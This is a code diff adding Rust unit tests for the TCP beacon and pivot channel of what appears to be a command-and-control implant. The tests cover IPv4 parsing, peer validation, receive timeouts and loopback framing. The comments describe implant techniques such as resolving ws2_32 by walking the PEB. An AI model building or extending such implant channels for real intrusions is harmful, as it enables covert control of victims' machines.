@@ -632,3 +632,128 @@ unsafe fn tcp_exchange_recv(fns: &WsaFns, s: Socket) -> Option<Vec<u8>> {
     }
     body
 }
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+    use crate::testutil;
+    use nyx_implant_core::heap::String;
+    use std::time::Duration;
+
+    #[test]
+    fn parse_ipv4_be_accepts_dotted_decimal() {
+        assert_eq!(parse_ipv4_be(b"127.0.0.1"), Some(0x7F00_0001));
+        assert_eq!(parse_ipv4_be(b"0.0.0.0"), Some(0));
+        assert_eq!(parse_ipv4_be(b"255.255.255.255"), Some(0xFFFF_FFFF));
+        assert_eq!(parse_ipv4_be(b"10.20.30.40"), Some(0x0A14_1E28));
+        // Network byte order: octet 0 lands in the most-significant byte.
+        assert_eq!(parse_ipv4_be(b"1.2.3.4"), Some(0x0102_0304));
+    }
+
+    #[test]
+    fn parse_ipv4_be_rejects_malformed() {
+        let bad: &[&[u8]] = &[
+            b"",
+            b"1.2.3",
+            b"1.2.3.4.5",
+            b"256.1.1.1",
+            b"1.2.3.999",
+            b"1.2.3.",
+            b".1.2.3",
+            b"1..2.3",
+            b"a.b.c.d",
+            b"1.2.3.4x",
+            b"1.2.3.4 ",
+            // Octet accumulator overflows u16 before the >255 check.
+            b"65536.0.0.1",
+        ];
+        for s in bad {
+            assert_eq!(parse_ipv4_be(s), None, "must reject {:?}", s);
+        }
+    }
+
+    #[test]
+    fn send_recv_rejects_unconfigured_or_bad_peer() {
+        // Empty peer host → unconfigured.
+        let mut c = testutil::ctx("127.0.0.1", 9);
+        assert!(unsafe { send_recv(&c, b"x") }.is_none());
+        // Malformed IPv4 → rejected before any syscall.
+        c.tcp_peer_host = String::from("999.1.1.1");
+        c.tcp_peer_port = 4444;
+        assert!(unsafe { send_recv(&c, b"x") }.is_none());
+        // Port 0 → unconfigured.
+        c.tcp_peer_host = String::from("127.0.0.1");
+        c.tcp_peer_port = 0;
+        assert!(unsafe { send_recv(&c, b"x") }.is_none());
+    }
+
+    /// Bounded-I/O contract (implant-channels-3): a peer that accepts the TCP
+    /// connection but never sends a response must NOT hold the beacon thread
+    /// forever — SO_RCVTIMEO (IO_TIMEOUT_MS = 10 s) bounds the recv and the
+    /// channel reports failure. Deterministic on every stack: a silent peer
+    /// can never produce `Some`.
+    #[test]
+    fn send_recv_silent_peer_fails_within_io_timeout() {
+        let listener = std::net::TcpListener::bind("127.0.0.1:0").expect("bind");
+        let port = listener.local_addr().unwrap().port();
+        std::thread::spawn(move || {
+            // Accept and hold the connection open in silence (wedged parent
+            // beacon). The socket dies with the test process.
+            let _conn = listener.accept();
+            std::thread::sleep(std::time::Duration::from_secs(30));
+        });
+        let mut c = testutil::ctx("127.0.0.1", 9);
+        c.tcp_peer_host = String::from("127.0.0.1");
+        c.tcp_peer_port = port;
+        let t0 = std::time::Instant::now();
+        let out = unsafe { send_recv(&c, b"PING") };
+        let elapsed = t0.elapsed();
+        assert!(out.is_none(), "a silent peer can never yield a frame");
+        assert!(
+            elapsed < std::time::Duration::from_secs(25),
+            "silent peer held the channel for {elapsed:?} — SO_RCVTIMEO is not bounding the recv"
+        );
+    }
+
+    /// Full Winsock round trip: PEB-walk resolution of ws2_32, WSAStartup,
+    /// bounded non-blocking connect, LE-length-prefixed framing in both
+    /// directions, clean teardown.
+    ///
+    /// IGNORED by default: the dev-host emulator (wine 7.7, Game Porting
+    /// Toolkit) accepts the connection and reports successful connect/send via
+    /// ws2_32, but its loopback data plane never delivers bytes to a raw
+    /// ws2_32 socket (verified with standalone probes: server receives
+    /// nothing, client recv sees EOF/timeout — WinHTTP loopback in the same
+    /// process works, so this is a wine ws2_32 fidelity gap, not an implant
+    /// logic bug). Run on real Windows with `-- --ignored`.
+    #[test]
+    #[ignore = "wine 7.7 GPTK ws2_32 loopback data plane drops traffic; run on real Windows"]
+    fn send_recv_loopback_frame_roundtrip() {
+        let (port, rx) = testutil::one_shot_tcp_frame_server(b"PONG".to_vec());
+        let mut c = testutil::ctx("127.0.0.1", 9);
+        c.tcp_peer_host = String::from("127.0.0.1");
+        c.tcp_peer_port = port;
+        let out = unsafe { send_recv(&c, b"PING") };
+        assert_eq!(out.as_deref(), Some(b"PONG".as_slice()));
+        let got = rx
+            .recv_timeout(Duration::from_secs(15))
+            .expect("pivot server received frame");
+        assert_eq!(got, b"PING");
+    }
+
+    #[test]
+    fn send_recv_closed_port_fails_fast() {
+        // Nothing listening → bounded connect fails, mapped to None.
+        let port = {
+            let l = std::net::TcpListener::bind("127.0.0.1:0").expect("bind");
+            l.local_addr().unwrap().port()
+        };
+        let mut c = testutil::ctx("127.0.0.1", 9);
+        c.tcp_peer_host = String::from("127.0.0.1");
+        c.tcp_peer_port = port;
+        assert!(unsafe { send_recv(&c, b"x") }.is_none());
+    }
+}
+
+
+
